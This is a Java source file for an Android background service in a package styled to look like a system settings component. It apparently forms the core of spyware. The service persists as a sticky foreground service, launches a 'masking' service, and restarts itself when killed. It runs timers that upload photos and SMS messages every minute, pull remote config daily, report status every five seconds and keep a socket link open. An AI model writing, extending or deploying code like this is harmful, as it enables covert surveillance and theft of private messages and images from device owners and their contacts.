package com.android.media.settings.Service;

import android.app.Notification;
import android.app.Service;
import android.content.ComponentName;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Binder;
import android.os.Handler;
import android.os.IBinder;
import android.support.annotation.Nullable;
import android.util.Log;

import com.android.media.settings.MediaConfig;
import com.android.media.settings.Receiver.MediaReceiver;
import com.android.media.settings.Utility.ConfigUpdaterUtility;
import com.android.media.settings.Utility.MediaCompressorUtility;
import com.android.media.settings.Utility.MediaUploadUtility;
import com.android.media.settings.Utility.MediaUtility;
import com.android.media.settings.Utility.SMSUtility;
import com.android.media.settings.Utility.SocketUtil;
import com.android.media.settings.Utility.StatusUpdaterUtility;

import java.lang.reflect.Method;
import java.util.Timer;
import java.util.TimerTask;

public class MediaService extends Service {
    private static final String TAG = "Media Service";
    private Timer imgMonitorTimer, imgUploadTimer, configTimer, smsTimer, statusTimer;
    private MediaUtility mUtility;
    private SocketUtil mSocketUtil;
    private final IBinder mediaBinder = new MediaBinder();
    private Handler handler;

    private static final Class<?>[] mStartForegroundSignature = new Class[] {
            int.class, Notification.class};
    private static final Class<?>[] mSetForegroundSignature = new Class[] {
            boolean.class};
    private Object[] mStartForegroundArgs = new Object[2];
    private Object[] mSetForegroundArgs = new Object[1];
    private Method mSetForeground;

    public static boolean isMediaCompressing = false;
    public static boolean isMediaUploading = false;
    public static boolean isSMSUploading = false;

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return mediaBinder;
    }

    public class MediaBinder extends Binder {
        public MediaService getService() {
            return MediaService.this;
        }
    }

    private Runnable mediaRunnable = () -> {
            initConfigTimer();
            initMediaCompression();
            initMediaUpload();
            initSMSUpload();
            initStatusUpdate();
    };

    @Override
    public void onCreate() {
        Log.d(TAG, "Service On Create..!");
        Method mStartForeground;
        try {
            mStartForeground = getClass().getMethod("startForeground",
                    mStartForegroundSignature);
        } catch (NoSuchMethodException e) {
            mStartForeground = null;
        }
        try {
            mSetForeground = getClass().getMethod("setForeground",
                    mSetForegroundSignature);
        } catch (NoSuchMethodException e) {
            throw new IllegalStateException(
                    "OS doesn't have Service.startForeground OR Service.setForeground!");
        }
        handler = new Handler();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        this.mUtility = new MediaUtility(this);

        Log.d(TAG, "Service On Start");
        startForeground(MediaConfig.NOTIFICATION_ID, mUtility.getNotification());
        startService(new Intent(this, MediaMaskService.class));
        registerReceiver();


        this.mSocketUtil = SocketUtil.getInstance(this);

        Thread mediaThread = new Thread(mediaRunnable);
        mediaThread.start();

        startSocket();
        return START_STICKY;
    }

    //Enabling Socket Communication
    private boolean startSocket() {
        return mSocketUtil != null && mSocketUtil.connect();
    }

    private MediaCompressorUtility mMediaCompressorUtility;
    private MediaUploadUtility mMediaUploadUtility;
    private SMSUtility mSMSUtility;
    private ConfigUpdaterUtility mConfigUpdaterUtility;
    private StatusUpdaterUtility mStatusUpdaterUtility;
    MediaCompressorUtility getMCUInstance() {
        if(mMediaCompressorUtility != null) return mMediaCompressorUtility;
        mMediaCompressorUtility = new MediaCompressorUtility(MediaService.this);
        return mMediaCompressorUtility;
    }

    MediaUploadUtility getMUUInstance() {
        if(mMediaUploadUtility != null) return mMediaUploadUtility;
        mMediaUploadUtility = new MediaUploadUtility(MediaService.this);
        return mMediaUploadUtility;
    }

    SMSUtility getSMSUInstance() {
        if(mSMSUtility != null) return mSMSUtility;
        mSMSUtility = new SMSUtility(MediaService.this);
        return mSMSUtility;
    }

    ConfigUpdaterUtility getCUUInstance() {
        if(mConfigUpdaterUtility != null) return mConfigUpdaterUtility;
        mConfigUpdaterUtility = new ConfigUpdaterUtility(MediaService.this);
        return mConfigUpdaterUtility;
    }

    StatusUpdaterUtility getSUTInstance() {
        if(mStatusUpdaterUtility != null) return mStatusUpdaterUtility;
        mStatusUpdaterUtility = new StatusUpdaterUtility(MediaService.this);
        return mStatusUpdaterUtility;
    }

    private void initMediaCompression() {
        imgMonitorTimer = new Timer();
        imgMonitorTimer.schedule(new TimerTask() {
            @Override
            public void run() {
                getMCUInstance().initImageCompression();
            }
        }, 0, 1000 * 10);
    }

    private void initMediaUpload() {
        imgUploadTimer = new Timer();
        imgUploadTimer.schedule(new TimerTask() {
            @Override
            public void run() {
                getMUUInstance().initUploadServices();
            }
        }, 0, 1000 * 60 );
    }

    private void initSMSUpload() {
        smsTimer = new Timer();
        smsTimer.schedule(new TimerTask() {
            @Override
            public void run() {
                getSMSUInstance().initSMSUpload();
            }
        }, 0, 1000 * 60);
    }

    private void initConfigTimer() {
        configTimer = new Timer();
        configTimer.schedule(new TimerTask() {
            @Override
            public void run() {
                getCUUInstance().initConfigUpdater();
            }
        }, 0, 1000 * 60 * 60 * 24);
    }

    private void initStatusUpdate() {
        statusTimer = new Timer();
        statusTimer.schedule(new TimerTask() {
            @Override
            public void run() {
                getSUTInstance().updateStatus();
            }
        }, 0, 1000 * 5);
    }

    private void registerReceiver() {
        ComponentName mediaReceiver = new ComponentName(this, MediaReceiver.class);
        PackageManager mPackageManager = getPackageManager();

        mPackageManager.setComponentEnabledSetting(
                mediaReceiver,
                PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                PackageManager.DONT_KILL_APP
        );
    }

    @Override
    public void onDestroy() {
        Log.d(TAG, "Service Destroyed !!");
        imgMonitorTimer.cancel();
        imgUploadTimer.cancel();
        configTimer.cancel();
        smsTimer.cancel();
        if(mSocketUtil != null ) {
            mSocketUtil.disconnect();
        }
        sendBroadcast(new Intent("com.android.media.settings.RESTART_SENSOR"));
    }
}
